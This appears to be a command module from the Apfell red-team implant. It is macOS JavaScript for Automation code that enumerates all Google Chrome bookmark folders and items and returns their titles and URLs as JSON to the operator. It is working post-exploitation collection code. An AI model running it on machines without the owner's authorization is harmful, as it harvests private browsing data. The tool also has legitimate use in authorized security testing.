exports.chrome_bookmarks = function(task, command, params){
    let chrome_bookmarks_enum_folder = function(folder, folderPath = "", parentIndex = ""){
        let folderData = {};
        folderData["Folder Name"] = folderPath + folder.title();
        folderData["bookmarks"] = [];
        // once we are done with folders, let's work on the bookmarked items
        let entries = chrome_bookmarks_enum_items(folder, parentIndex);
        folderData["bookmarks"].push(...entries);
        // for each folder under our current bookmark folder - call chrome_bookmarks_enum_folder
        for (let i = 0; i < folder.bookmarkFolders.length; i++){
            folderData["bookmarks"].push({...chrome_bookmarks_enum_folder(folder.bookmarkFolders[i], folderPath + folder.title() + "/",  String(folder.index()-1))});
        }
        return folderData;
    };

    let chrome_bookmarks_enum_items = function(folder, parentIndex){
        let bookmarks = folder.bookmarkItems;
        let entries = [];
        for (let j = 0; j < bookmarks.length; j++){
            let indexPath = parentIndex === "" ? String(folder.index()-1) + "/" + String(bookmarks[j].index()-1) : parentIndex + "/" + String(folder.index()-1) + "/" + String(bookmarks[j].index()-1);
            entries.push({
                "Title": bookmarks[j].title(),
                "URL": bookmarks[j].url(),
                "Folder/bookmark": indexPath
            });
        }
        return entries;
    };
	let all_data = [];
	try{
		let ch = Application("Google Chrome");
		if(ch.running()){
            let folders = ch.bookmarkFolders;
            for (let i = 0; i < folders.length; i ++){
                let folder = folders[i];
                // we are using the fact that JS passes arrays by reference here to pass a reference to all_data
                all_data.push(chrome_bookmarks_enum_folder(folder));
            }
        }
        else{
            return {"user_output": "Chrome is not running", "completed": true, "status": "error"};
        }
	}catch(error){
		let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return {"user_output":err, "completed": true, "status": "error"};
	}
	return {"user_output": JSON.stringify(all_data, null, 2), "completed": true};
};

